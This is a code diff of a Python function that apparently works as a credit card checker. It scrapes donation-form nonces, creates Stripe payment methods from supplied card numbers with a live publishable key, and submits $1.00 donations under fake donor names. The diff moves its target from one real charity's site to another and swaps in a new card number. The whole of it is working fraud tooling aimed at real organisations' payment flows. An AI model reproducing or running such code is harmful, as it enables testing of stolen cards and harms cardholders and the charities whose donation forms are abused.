         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -2834,23 +2815,23 @@ def go14(cc_input: str) -> str:
         	
         #2
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'pragma': 'no-cache',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': user,
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user,
         }
-        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&referrer=https%3A%2F%2Farkfamilycenter.org&time_on_page=17988&client_attribution_metadata[client_session_id]=27b19589-078d-4328-bc15-b39f3f360a8d&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51GXY3MLASlwZcI63QqGIyDGkwkqwV9Pig9CaRgqcv7Jb5lFhaJbbeyXOl5LgdjpM5XwB7h8W7ivSU42AsjZIJKtR00RADrx9J2'
+        
+        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Frun4yitzi.com&time_on_page=34596&client_attribution_metadata[client_session_id]=28d55e99-c05d-430a-8c92-27a89d8614ce&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51B6NBPJJO0cqdeICzeIjfbSS9mWmFphJtUSTDmmt83nxla4ijEQgdQJTxay8yow8GPsEqm1OSi7y0WO82waDRJD100Qy0rGkUb'
+        
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         res_json = response.json()
         pm = res_json.get('id')
@@ -2861,63 +2842,55 @@ def go14(cc_input: str) -> str:
                 
         #3
         cookies = {
-    '_tccl_visitor': 'a2c6e59f-5e24-46f9-9d50-1bf6973fa5eb',
-    '__stripe_mid': 'c1b02b6b-d3f0-4d03-9754-a0780c0ad663a6d971',
-    '__cf_bm': 'HZzzk5.kzGvuBGyTRXF5tJM30s2CJT5uxvMByiokJTQ-1766515238-1.0.1.1-roGbgn4niRUCtrguqcAd1BrYC5qSOQL2TFUGUlGVuauJYMRLCTutR9wG9NMY_ugHBIWZi2Tw3AaDClq3MT.QXwCLbgCeI9QfTgzQ8r1_RS4',
-    'charitable_session': '0eb168c08fc9cc064b6be2f8f2b3092b||86400||82800',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-12-23%2019%3A10%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2025-12-23%2019%3A10%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
-    '_tccl_visit': '8138d7dc-1e23-4a6d-aa02-07ec11bdb361',
-    '__stripe_sid': 'c7fea19a-bb6d-4da6-8c97-bd768f4ac4051e0f0f',
-    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F',
-    '_scc_session': 'pc=2&C_TOUCH=2025-12-23T18:41:46.371Z',
+            'charitable_session': 'f172c8057d0422d36984dd4f12c7e7a3||86400||82800',
+            '_ga_NDJN4WKJVS': 'GS2.1.s1767347483$o1$g0$t1767347483$j60$l0$h0',
+            '_ga': 'GA1.2.457464258.1767347484',
+            '_gid': 'GA1.2.110531386.1767347484',
+            '_gat_gtag_UA_32258511_9': '1',
+            '__stripe_mid': 'd0be3287-881e-45f7-8962-4c891b5fa80523afe2',
+            '__stripe_sid': '81d747db-3e3e-47c3-8547-9e06b0ecc6afb0ea72',
         }
+        
         headers = {
-    'authority': 'arkfamilycenter.org',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    # 'cookie': '_tccl_visitor=a2c6e59f-5e24-46f9-9d50-1bf6973fa5eb; __stripe_mid=c1b02b6b-d3f0-4d03-9754-a0780c0ad663a6d971; __cf_bm=HZzzk5.kzGvuBGyTRXF5tJM30s2CJT5uxvMByiokJTQ-1766515238-1.0.1.1-roGbgn4niRUCtrguqcAd1BrYC5qSOQL2TFUGUlGVuauJYMRLCTutR9wG9NMY_ugHBIWZi2Tw3AaDClq3MT.QXwCLbgCeI9QfTgzQ8r1_RS4; charitable_session=0eb168c08fc9cc064b6be2f8f2b3092b||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-23%2019%3A10%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-23%2019%3A10%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; _tccl_visit=8138d7dc-1e23-4a6d-aa02-07ec11bdb361; __stripe_sid=c7fea19a-bb6d-4da6-8c97-bd768f4ac4051e0f0f; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Farkfamilycenter.org%2Fdonate%2F; _scc_session=pc=2&C_TOUCH=2025-12-23T18:41:46.371Z',
-    'origin': 'https://arkfamilycenter.org',
-    'pragma': 'no-cache',
-    'referer': 'https://arkfamilycenter.org/donate/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': user,
-    'x-requested-with': 'XMLHttpRequest',
+            'authority': 'run4yitzi.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': 'charitable_session=f172c8057d0422d36984dd4f12c7e7a3||86400||82800; _ga_NDJN4WKJVS=GS2.1.s1767347483$o1$g0$t1767347483$j60$l0$h0; _ga=GA1.2.457464258.1767347484; _gid=GA1.2.110531386.1767347484; _gat_gtag_UA_32258511_9=1; __stripe_mid=d0be3287-881e-45f7-8962-4c891b5fa80523afe2; __stripe_sid=81d747db-3e3e-47c3-8547-9e06b0ecc6afb0ea72',
+            'origin': 'https://run4yitzi.com',
+            'referer': 'https://run4yitzi.com/campaigns/izabennaroch/donate/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
+        
         data = {
-    'charitable_form_id': f'{form_id}',
-    f'{form_id}': '',
-    '_charitable_donation_nonce': f'{donation_nonce}',
-    '_wp_http_referer': '/donate/',
-    'campaign_id': f'{campaign_id}',
-    'description': 'Ark Family Center',
-    'ID': f'{donation_id}',
-    'gateway': 'stripe',
-    'custom_donation_amount': '1.00',
-    'first_name': 'Tiana',
-    'last_name': 'Jakubowski',
-    'email': email,
-    'stripe_payment_method': f'{pm}',
-    'action': 'make_donation',
-    'form_action': 'make_donation',
+            'charitable_form_id': f'{form_id}',
+            f'{form_id}': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/campaigns/izabennaroch/donate/',
+            'campaign_id': f'{campaign_id}',
+            'description': 'Iza Benarroch',
+            'ID': f'{donation_id}',
+            'gateway': 'stripe',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'recurring_donation': 'once',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'donor_comment': '',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
         }
-        response = requests.post(
-    'https://arkfamilycenter.org/wp-admin/admin-ajax.php',
-    cookies=cookies,
-    headers=headers,
-    data=data,#, proxies=proxy, timeout=30)    
-        )
+        
+        response = requests.post('https://run4yitzi.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -2954,7 +2927,7 @@ def go14(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51gxy3mlaslwzci63qqgiydgkwkqwv9pig9cargqcv7jb5lfhajbbeyxol5lgdjpm5xwb7h8w7ivsu42asjzijktr00radrx9j2',
+    'key': 'pk_live_51B6NBPJJO0cqdeICzeIjfbSS9mWmFphJtUSTDmmt83nxla4ijEQgdQJTxay8yow8GPsEqm1OSi7y0WO82waDRJD100Qy0rGkUb',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -2974,7 +2947,7 @@ def go14(cc_input: str) -> str:
     except Exception as e:
         print(f"Error occurred: {e}")
 #================================        
-#test_card = "5196032149064509|01|27|915"
+#test_card = "4441114465823639|05|2029|839"
 #print(go0(test_card))
 #print(go1(test_card))
 #print(go2(test_card))
